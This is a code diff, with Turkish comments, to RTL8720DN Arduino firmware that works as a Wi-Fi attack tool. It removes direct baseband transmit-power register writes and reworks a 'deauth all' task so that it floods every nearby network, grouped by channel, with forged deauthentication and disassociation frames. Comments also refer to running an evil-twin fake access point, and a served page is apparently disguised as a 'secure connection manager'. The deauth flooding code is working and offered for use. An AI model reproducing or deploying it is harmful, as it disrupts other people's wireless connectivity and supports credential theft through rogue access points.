@@ -21,6 +21,14 @@ extern "C" {
   bool le_adv_set_param(uint8_t param, uint8_t len, void *p_value);
 }
 
+// ── WiFi BB register yazımı neden YOK ────────────────────────────────────────
+// RTL8720DN çift çekirdeklidir: KM0 (WiFi sürücüsü) + KM4 (Arduino kodu).
+// WiFi BB register'ları (0x40080000+) yalnızca KM0 bus alanındadır.
+// KM4'ten doğrudan pointer ile yazım çalışmaz (0xEAEAEAEA bus hata yanıtı).
+// rtw_hal_write_bbreg() denendi ancak rltk_wlan_info adapter pointer'ı
+// geçersiz olduğunda setup() crash ediyor — AP kalkmıyor.
+// Güç yönetimi wifi_disable_powersave() ile yapılıyor; bu SDK IPC çağrısıdır.
+
 #undef max
 #undef min
 #include <vector>
@@ -58,63 +66,13 @@ extern "C" {
   int  wifi_connect(char *ssid, rtw_security_t security_type, char *password, int ssid_len, int password_len, int key_id, void *semaphore);
 }
 
-// ── WiFi BB (Baseband) TX Power Register Adresleri ──────────────────────────
-// Tüm adresler km0_km4_image2.bin binary analizi ile DOĞRULANDI:
-//
-//   Yöntem 1 — Debug string'leri (0x0a8e84):
-//     "CCK 1(0xe08)= 0x%x"        → 0xE08
-//     "CCK 11~2(0x86c)= 0x%x"     → 0x86C
-//     "OFDM 18~6(0xe00)= 0x%x"    → 0xE00
-//     "OFDM 54~24(0xe04)= 0x%x"   → 0xE04
-//     "MCS 3~0(0xe10)= 0x%x"      → 0xE10
-//     "MCS 7~4(0xe14)= 0x%x"      → 0xE14
-//
-//   Yöntem 2 — 32-bit adres tabloları (0x1b188 ve 0x1ba30):
-//     0x40080E08: 7 hit | 0x4008086C: 7 hit | 0x40080E00: 7 hit
-//     0x40080E04: 8 hit | 0x40080E10: 7 hit | 0x40080E14: 6 hit
-//     0x40080E18: 4 hit | 0x40080E1C: 2 hit
-//
-//   VHT (0xE20-0xE4C): binary'de 0 hit — bu firmware'de BB VHT reg. YOK.
-//   0xE0C: binary'de 0 hit — power register değil.
-//   0x7F max: 0xFF bazı Realtek PHY'lerinde signed -1 yorumlanır → güç düşer.
-#define WIFI_BB_BASE        0x40080000UL
-// ── 2.4GHz CCK ──────────────────────────────────────────────────────────────
-#define BB_CCK1_PWR_REG     0xE08   // CCK ch1        — 7 hit binary  + debug str
-#define BB_CCK2_11_PWR_REG  0x86C   // CCK ch2-11     — 7 hit binary  + debug str
-// ── OFDM — 2.4GHz + 5GHz ────────────────────────────────────────────────────
-#define BB_OFDM_LO_PWR_REG  0xE00   // OFDM 6~18Mbps  — 7 hit binary  + debug str
-#define BB_OFDM_HI_PWR_REG  0xE04   // OFDM 24~54Mbps — 8 hit binary  + debug str
-// ── HT20 MCS — 2.4GHz + 5GHz ────────────────────────────────────────────────
-#define BB_MCS_LO_PWR_REG   0xE10   // MCS 0~3 HT20   — 7 hit binary  + debug str
-#define BB_MCS_HI_PWR_REG   0xE14   // MCS 4~7 HT20   — 6 hit binary  + debug str
-// ── HT40 MCS — 5GHz geniş kanal ─────────────────────────────────────────────
-#define BB_MCS_HT40_LO_REG  0xE18   // MCS 0~3 HT40   — 4 hit binary  (adres tablosu)
-#define BB_MCS_HT40_HI_REG  0xE1C   // MCS 4~7 HT40   — 2 hit binary  (adres tablosu)
-
-// Her 32-bit register: 4 ayrı güç indeksi (8-bit/indeks).
-// 0x7F = 127 — tüm indeksleri pozitif maksimuma ayarlar.
-#define BB_PWR_MAX_VAL      0x7F7F7F7FUL
-
-static inline void wifiSetMaxBBTxPower(void) {
-  // wifi_on() çağrıldıktan SONRA çalıştır — chip aktif olmalı.
-  volatile uint32_t *r;
-  // 2.4GHz CCK
-  r = (volatile uint32_t *)(WIFI_BB_BASE + BB_CCK1_PWR_REG);     *r = BB_PWR_MAX_VAL;
-  r = (volatile uint32_t *)(WIFI_BB_BASE + BB_CCK2_11_PWR_REG);  *r = BB_PWR_MAX_VAL;
-  // OFDM — 2.4GHz + 5GHz
-  r = (volatile uint32_t *)(WIFI_BB_BASE + BB_OFDM_LO_PWR_REG);  *r = BB_PWR_MAX_VAL;
-  r = (volatile uint32_t *)(WIFI_BB_BASE + BB_OFDM_HI_PWR_REG);  *r = BB_PWR_MAX_VAL;
-  // HT20 MCS — 2.4GHz + 5GHz
-  r = (volatile uint32_t *)(WIFI_BB_BASE + BB_MCS_LO_PWR_REG);   *r = BB_PWR_MAX_VAL;
-  r = (volatile uint32_t *)(WIFI_BB_BASE + BB_MCS_HI_PWR_REG);   *r = BB_PWR_MAX_VAL;
-  // HT40 MCS — 5GHz geniş kanal
-  r = (volatile uint32_t *)(WIFI_BB_BASE + BB_MCS_HT40_LO_REG);  *r = BB_PWR_MAX_VAL;
-  r = (volatile uint32_t *)(WIFI_BB_BASE + BB_MCS_HT40_HI_REG);  *r = BB_PWR_MAX_VAL;
-  // ARM Cortex-M33: volatile write bus transaction'ın donanımda tamamlanmasını
-  // garantilemez. DSB (Data Synchronization Barrier) tüm write'ların peripheral'a
-  // ulaşmasını sağlar — sonraki wifi_disable_powersave() güvenli çalışır.
-  __asm volatile("dsb" ::: "memory");
-}
+// ── WiFi BB register yazımı neden YOK ────────────────────────────────────────
+// RTL8720DN çift çekirdeklidir: KM0 (WiFi sürücüsü) + KM4 (Arduino kodu).
+// WiFi BB register'ları (0x40080000+) yalnızca KM0 bus alanındadır.
+// KM4'ten bu adreslere yazıldığında bus matrisi yazımı reddeder → 0xEAEAEAEA
+// okunur (bus hata yanıtı). Doğrudan register yazımı çalışmaz.
+// Güç yönetimi wifi_disable_powersave() ile sağlanıyor — o bir SDK IPC çağrısı
+// olduğu için KM0 üzerinden gerçekten işlem görür.
 
 #ifndef PACK_STRUCT_FIELD
 #define PACK_STRUCT_FIELD(x) x
@@ -546,7 +504,6 @@ void scanNetworkTask(void *param) {
     raw_scan_sem = xSemaphoreCreateBinary();
   }
 
-  wifiSetMaxBBTxPower();
   wifi_disable_powersave();
   wifi_scan_networks(raw_scan_handler, NULL);
 
@@ -623,8 +580,6 @@ void wifiConnectTask(void *param) {
 
   if (ret == RTW_SUCCESS) {
     vTaskDelay(pdMS_TO_TICKS(100));  // 100ms'e indirildi
-    // wifi_connect() PHY'ı hedef kanalda yeniden kalibre eder — BB güç yeniden yaz
-    wifiSetMaxBBTxPower();
     wifi_disable_powersave();
     conn_status = CS_DONE_OK;
   } else {
@@ -668,7 +623,6 @@ void deauthTask(void *param) {
     0x00, 0x00, 0x07, 0x00 
   };
 
-  wifiSetMaxBBTxPower();
   wifi_disable_powersave();
 
   unsigned long last_deauth_burst = millis();
@@ -686,15 +640,12 @@ void deauthTask(void *param) {
     }
     last_deauth_burst = millis();
 
-    // Her 8 burst'te bir güç register'larını yeniden yaz (driver sıfırlamaya karşı)
     if ((++burst_counter & 0x07) == 0) {
-      wifiSetMaxBBTxPower();
       wifi_disable_powersave();
     }
 
     // 2.4GHz DEAUTH
     wifi_set_channel(target_channel);
-    wifiSetMaxBBTxPower();
     wifi_disable_powersave();
     vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));
 
@@ -752,7 +703,6 @@ void deauthTask(void *param) {
 
     if (ch5g > 0 && ch5g != target_channel && bssid5g[0] != 0 && !isFakeAPBSSID(bssid5g)) {
         wifi_set_channel(ch5g);
-        wifiSetMaxBBTxPower();
         wifi_disable_powersave();
         vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));
 
@@ -804,9 +754,7 @@ void deauthTask(void *param) {
         }
     }
 
-    // 5GHz deauth sonrası 2.4GHz kanalına dönüş — BB güç yeniden uygula
     wifi_set_channel(target_channel);
-    wifiSetMaxBBTxPower();
     wifi_disable_powersave();
     vTaskDelay(pdMS_TO_TICKS(5));
   }
@@ -909,9 +857,7 @@ void deauthAllTask(void *param) {
     0x00, 0x00, 0x07, 0x00
   };
 
-  wifiSetMaxBBTxPower();
   wifi_disable_powersave();
-
 
   // ── Deauth All hız parametreleri ──────────────────────────────────────────
   const int DA_FRAME_COUNT_2G   = 6;    // burst başına frame sayısı
@@ -960,75 +906,88 @@ void deauthAllTask(void *param) {
     }
 
 
-    // ── WiFi Deauth turu ──────────────────────────────────────────────────────
-    wifiSetMaxBBTxPower();
+    // ── WiFi Deauth turu — kanallar gruplandırılmış ───────────────────────────
+    // Aynı kanalda olan ağları tek kanal switch'i ile saldır.
+    // Kanal sırası: önce 2.4GHz (1-14), sonra 5GHz (36+).
     wifi_disable_powersave();
-    for (auto &net : snap) {
-      if (!deauth_all_active) break;
-      if (isFakeAPBSSID(net.bssid)) continue;
 
-      bool is5g = (net.channel >= 36);
+    // Snapshot'taki unique kanalları sıralı olarak topla
+    std::vector<int> ch_order;
+    for (auto &net : snap) {
+      if (isFakeAPBSSID(net.bssid)) continue;
+      bool found = false;
+      for (int c : ch_order) { if (c == net.channel) { found = true; break; } }
+      if (!found) ch_order.push_back(net.channel);
+    }
+    // 2.4GHz önce, 5GHz sonra
+    std::vector<int> ch_sorted;
+    for (int c : ch_order) { if (c < 36) ch_sorted.push_back(c); }
+    for (int c : ch_order) { if (c >= 36) ch_sorted.push_back(c); }
+
+    for (int ch : ch_sorted) {
+      if (!deauth_all_active) break;
+
+      bool is5g = (ch >= 36);
       int frameCount = is5g ? DA_FRAME_COUNT_5G : DA_FRAME_COUNT_2G;
       int extraBurst = is5g ? DA_EXTRA_COUNT_5G : DA_EXTRA_COUNT_2G;
 
-      wifi_set_channel(net.channel);
-      wifiSetMaxBBTxPower();
-      wifi_disable_powersave();
-      vTaskDelay(pdMS_TO_TICKS(DA_CH_SWITCH_MS)); // kanal stabilizasyon için minimum bekleme
+      // Bu kanal için bir kez switch — gruptaki tüm ağlar buradan saldırılır
+      wifi_set_channel(ch);
+      vTaskDelay(pdMS_TO_TICKS(DA_CH_SWITCH_MS));
 
-      // ── BSSID varyantlarını burst öncesi hesapla — iç döngüde isFakeAP çağrısı yok
-      uint8_t variants[3][6];
-      int vcount = 0;
-      for (int off = -1; off <= 1; off++) {
-        uint8_t tmp[6];
-        memcpy(tmp, net.bssid, 6);
-        tmp[5] = (uint8_t)(tmp[5] + (uint8_t)off);
-        if (!isFakeAPBSSID(tmp)) {
-          memcpy(variants[vcount++], tmp, 6);
+      // Aynı kanalda olan tüm ağları sırayla saldır
+      for (auto &net : snap) {
+        if (!deauth_all_active) break;
+        if (net.channel != ch) continue;
+        if (isFakeAPBSSID(net.bssid)) continue;
+
+        // ── BSSID varyantlarını hesapla ─────────────────────────────────────
+        uint8_t variants[3][6];
+        int vcount = 0;
+        for (int off = -1; off <= 1; off++) {
+          uint8_t tmp[6];
+          memcpy(tmp, net.bssid, 6);
+          tmp[5] = (uint8_t)(tmp[5] + (uint8_t)off);
+          if (!isFakeAPBSSID(tmp)) {
+            memcpy(variants[vcount++], tmp, 6);
+          }
         }
-      }
-      if (vcount == 0) continue;
+        if (vcount == 0) continue;
 
-      // ── Ana burst: broadcast + unicast deauth/disassoc — taskYIELD YOK ──────
-      // taskYIELD kaldırıldı: her yield WiFi stack'e 10-50ms veriyor
-      for (int burst = 0; burst < frameCount; burst++) {
-        for (int v = 0; v < vcount; v++) {
-          // Broadcast deauth (reason 7)
-          memcpy(&frame[10], variants[v], 6);
-          memcpy(&frame[16], variants[v], 6);
-          memset(&frame[4], 0xFF, 6);
-          frame[0] = 0xC0; frame[24] = 0x07;
+        // ── Ana burst: broadcast + unicast deauth/disassoc ──────────────────
+        for (int burst = 0; burst < frameCount; burst++) {
+          for (int v = 0; v < vcount; v++) {
+            memcpy(&frame[10], variants[v], 6);
+            memcpy(&frame[16], variants[v], 6);
+            memset(&frame[4], 0xFF, 6);
+            frame[0] = 0xC0; frame[24] = 0x07;
+            safeSendMgnt(frame, 26);         // broadcast deauth
+
+            frame[24] = 0x02;
+            safeSendMgnt(frame, 26);         // broadcast disassoc
+
+            memcpy(&frame[4], variants[v], 6);
+            frame[0] = 0xC0; frame[24] = 0x07;
+            safeSendMgnt(frame, 26);         // unicast deauth
+
+            frame[0] = 0xA0; frame[24] = 0x07;
+            safeSendMgnt(frame, 26);         // unicast disassoc
+          }
+        }
+
+        // ── Ek broadcast burst ───────────────────────────────────────────────
+        memcpy(&frame[10], net.bssid, 6);
+        memcpy(&frame[16], net.bssid, 6);
+        memset(&frame[4], 0xFF, 6);
+        frame[0] = 0xC0; frame[24] = 0x07;
+        for (int extra = 0; extra < extraBurst; extra++) {
           safeSendMgnt(frame, 26);
-
-          // Broadcast disassoc (reason 2)
-          frame[24] = 0x02;
           safeSendMgnt(frame, 26);
-
-          // Unicast deauth
-          memcpy(&frame[4], variants[v], 6);
-          frame[0] = 0xC0; frame[24] = 0x07;
-          safeSendMgnt(frame, 26);
-
-          // Unicast disassoc
-          frame[0] = 0xA0; frame[24] = 0x07;
           safeSendMgnt(frame, 26);
         }
-        // taskYIELD() YOK — CPU'yu bırakmadan devam et
-      }
 
-      // ── Ek broadcast burst — sadece broadcast deauth, hızlı ve yoğun ─────────
-      memcpy(&frame[10], net.bssid, 6);
-      memcpy(&frame[16], net.bssid, 6);
-      memset(&frame[4], 0xFF, 6);
-      frame[0] = 0xC0; frame[24] = 0x07;
-      for (int extra = 0; extra < extraBurst; extra++) {
-        safeSendMgnt(frame, 26);
-        safeSendMgnt(frame, 26);
-        safeSendMgnt(frame, 26); // 3× gönder — backoff yoksa çok hızlı
+        vTaskDelay(pdMS_TO_TICKS(DA_NET_DWELL_MS));
       }
-
-      // ── Her ağ için minimum kalma süresi: frame'lerin havaya çıkmasını garantiler
-      vTaskDelay(pdMS_TO_TICKS(DA_NET_DWELL_MS));
     }
 
 
@@ -1310,6 +1269,7 @@ void sendStartPage(WiFiClient &client) {
     client.print("<button type='submit' style='background:#e74c3c;color:#fff;border:none;padding:8px 12px;border-radius:6px;font-size:0.8rem;cursor:pointer;width:auto;box-shadow:none;'>Sil</button>");
     client.print("</form></div></div>");
   }
+
   client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy;</div></div></body></html>");
 }
 
@@ -1620,10 +1580,6 @@ void setup() {
   wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK, (char *)AP_INITIAL_PASS, strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
   delay(800);
 
-  // ── WiFi BB TX power: AP başladıktan SONRA yaz ──────────────────────────
-  // wifi_start_ap() içinde PHY reinit olabilir — önce değil sonra yazılmalı.
-  // Böylece sahte AP (evil twin dahil) max güçte beacon yayar.
-  wifiSetMaxBBTxPower();
   wifi_disable_powersave();
 
   ip4_addr_t ip, mask, gw;
@@ -1688,7 +1644,6 @@ void loop() {
     dnsServer.begin();
     delay(150);
 
-    wifiSetMaxBBTxPower();
     wifi_disable_powersave();
 
     uint8_t new_bssid[6];
@@ -1745,7 +1700,6 @@ void loop() {
     delay(700);
 
     dnsServer.begin();
-    wifiSetMaxBBTxPower();
     wifi_disable_powersave();
     ap_running_channel = target_channel;
 
@@ -1790,7 +1744,6 @@ void loop() {
   }
 
   if (conn_status == CS_IDLE && scan_status == SCAN_IDLE && (millis() - last_scan_ms > RESCAN_INTERVAL_MS)) {
-    startScan();
   }
 
   if (ap_switched && (millis() - last_netif_check_ms > NETIF_CHECK_INTERVAL_MS)) {
@@ -1801,7 +1754,6 @@ void loop() {
       dhcps_init(&xnetif[1]);
     }
     wifi_set_channel(target_channel);
-    wifiSetMaxBBTxPower();
     wifi_disable_powersave();
   }
 
